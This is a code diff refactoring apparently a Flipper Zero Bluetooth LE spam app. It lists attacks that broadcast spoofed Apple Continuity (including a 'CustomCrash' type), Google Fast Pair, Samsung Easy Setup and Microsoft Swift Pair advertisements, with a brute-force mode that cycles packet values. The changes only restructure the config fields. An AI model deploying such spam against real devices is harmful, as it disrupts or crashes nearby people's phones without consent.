@@ -30,7 +30,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = false,
-                .cfg.specific.continuity =
+                .cfg.continuity =
                     {
                         .type = ContinuityTypeCustomCrash,
                         .data = {},
@@ -44,7 +44,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = false,
-                .cfg.specific.continuity =
+                .cfg.continuity =
                     {
                         .type = ContinuityTypeNearbyAction,
                         .data = {},
@@ -58,7 +58,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = false,
-                .cfg.specific.continuity =
+                .cfg.continuity =
                     {
                         .type = ContinuityTypeProximityPair,
                         .data = {},
@@ -72,7 +72,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = true,
-                .cfg.specific.fastpair = {},
+                .cfg.fastpair = {},
             },
     },
     {
@@ -82,7 +82,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = true,
-                .cfg.specific.easysetup =
+                .cfg.easysetup =
                     {
                         .type = EasysetupTypeBuds,
                         .data = {},
@@ -96,7 +96,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = true,
-                .cfg.specific.easysetup =
+                .cfg.easysetup =
                     {
                         .type = EasysetupTypeWatch,
                         .data = {},
@@ -110,7 +110,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = true,
-                .cfg.specific.swiftpair = {},
+                .cfg.swiftpair = {},
             },
     },
 };
@@ -171,18 +171,17 @@ static int32_t adv_thread(void* _ctx) {
     uint8_t mac[GAP_MAC_ADDR_SIZE];
     Payload* payload = &attacks[state->index].payload;
     const Protocol* protocol = attacks[state->index].protocol;
-    ProtocolCfg* _cfg = &payload->cfg;
     if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
     if(state->ctx.led_indicator) start_blink(state);
 
     while(state->advertising) {
         if(protocol) {
-            if(_cfg->mode == ProtocolModeBruteforce && _cfg->bruteforce.counter++ >= 10) {
-                _cfg->bruteforce.counter = 0;
-                _cfg->bruteforce.value =
-                    (_cfg->bruteforce.value + 1) % (1 << (_cfg->bruteforce.size * 8));
+            if(payload->mode == PayloadModeBruteforce && payload->bruteforce.counter++ >= 10) {
+                payload->bruteforce.counter = 0;
+                payload->bruteforce.value =
+                    (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
             }
-            protocol->make_packet(&size, &packet, &payload->cfg);
+            protocol->make_packet(&size, &packet, payload);
         } else {
             protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
         }
@@ -367,13 +366,13 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
         char str[32];
 
         canvas_set_font(canvas, FontBatteryPercent);
-        if(payload->cfg.mode == ProtocolModeBruteforce) {
+        if(payload->mode == PayloadModeBruteforce) {
             snprintf(
                 str,
                 sizeof(str),
                 "0x%0*lX",
-                payload->cfg.bruteforce.size * 2,
-                payload->cfg.bruteforce.value);
+                payload->bruteforce.size * 2,
+                payload->bruteforce.value);
         } else {
             snprintf(str, sizeof(str), "%ims", delays[state->delay]);
         }
@@ -382,7 +381,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
         canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);
 
         canvas_set_font(canvas, FontBatteryPercent);
-        if(payload->cfg.mode == ProtocolModeBruteforce) {
+        if(payload->mode == PayloadModeBruteforce) {
             canvas_draw_str_aligned(canvas, 64, 22, AlignCenter, AlignBottom, "Bruteforce");
             if(delays[state->delay] < 100) {
                 snprintf(str, sizeof(str), "%ims>", delays[state->delay]);
@@ -403,7 +402,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
                 "%02i/%02i: %s",
                 state->index + 1,
                 ATTACKS_COUNT,
-                protocol ? protocol->get_name(&payload->cfg) : "Everything AND");
+                protocol ? protocol->get_name(payload) : "Everything AND");
             canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 22, str);
         }
 
@@ -461,7 +460,7 @@ static bool input_callback(InputEvent* input, void* _ctx) {
         consumed = true;
 
         bool is_attack = state->index >= 0 && state->index <= ATTACKS_COUNT - 1;
-        ProtocolCfg* _cfg = is_attack ? &attacks[state->index].payload.cfg : NULL;
+        Payload* payload = is_attack ? &attacks[state->index].payload : NULL;
         bool advertising = state->advertising;
 
         switch(input->key) {
@@ -479,10 +478,10 @@ static bool input_callback(InputEvent* input, void* _ctx) {
             break;
         case InputKeyUp:
             if(is_attack) {
-                if(_cfg->mode == ProtocolModeBruteforce) {
-                    _cfg->bruteforce.counter = 0;
-                    _cfg->bruteforce.value =
-                        (_cfg->bruteforce.value + 1) % (1 << (_cfg->bruteforce.size * 8));
+                if(payload->mode == PayloadModeBruteforce) {
+                    payload->bruteforce.counter = 0;
+                    payload->bruteforce.value =
+                        (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
                 } else if(state->delay < COUNT_OF(delays) - 1) {
                     state->delay++;
                     if(advertising) start_blink(state);
@@ -491,10 +490,10 @@ static bool input_callback(InputEvent* input, void* _ctx) {
             break;
         case InputKeyDown:
             if(is_attack) {
-                if(_cfg->mode == ProtocolModeBruteforce) {
-                    _cfg->bruteforce.counter = 0;
-                    _cfg->bruteforce.value =
-                        (_cfg->bruteforce.value - 1) % (1 << (_cfg->bruteforce.size * 8));
+                if(payload->mode == PayloadModeBruteforce) {
+                    payload->bruteforce.counter = 0;
+                    payload->bruteforce.value =
+                        (payload->bruteforce.value - 1) % (1 << (payload->bruteforce.size * 8));
                 } else if(state->delay > 0) {
                     state->delay--;
                     if(advertising) start_blink(state);
@@ -503,10 +502,11 @@ static bool input_callback(InputEvent* input, void* _ctx) {
             break;
         case InputKeyLeft:
             if(input->type == InputTypeLong) {
-                state->ignore_bruteforce = _cfg ? (_cfg->mode != ProtocolModeBruteforce) : true;
+                state->ignore_bruteforce = payload ? (payload->mode != PayloadModeBruteforce) :
+                                                     true;
             }
             if(input->type == InputTypeShort || !is_attack || state->ignore_bruteforce ||
-               _cfg->mode != ProtocolModeBruteforce) {
+               payload->mode != PayloadModeBruteforce) {
                 if(state->index > PAGE_MIN) {
                     if(advertising) toggle_adv(state);
                     state->index--;
@@ -520,7 +520,7 @@ static bool input_callback(InputEvent* input, void* _ctx) {
 
                     uint8_t size;
                     uint8_t* packet;
-                    protocol->make_packet(&size, &packet, &payload->cfg);
+                    protocol->make_packet(&size, &packet, payload);
                     furi_hal_bt_custom_adv_set(packet, size);
                     free(packet);
 
@@ -541,10 +541,11 @@ static bool input_callback(InputEvent* input, void* _ctx) {
             break;
         case InputKeyRight:
             if(input->type == InputTypeLong) {
-                state->ignore_bruteforce = _cfg ? (_cfg->mode != ProtocolModeBruteforce) : true;
+                state->ignore_bruteforce = payload ? (payload->mode != PayloadModeBruteforce) :
+                                                     true;
             }
             if(input->type == InputTypeShort || !is_attack || state->ignore_bruteforce ||
-               _cfg->mode != ProtocolModeBruteforce) {
+               payload->mode != PayloadModeBruteforce) {
                 if(state->index < PAGE_MAX) {
                     if(advertising) toggle_adv(state);
                     state->index++;
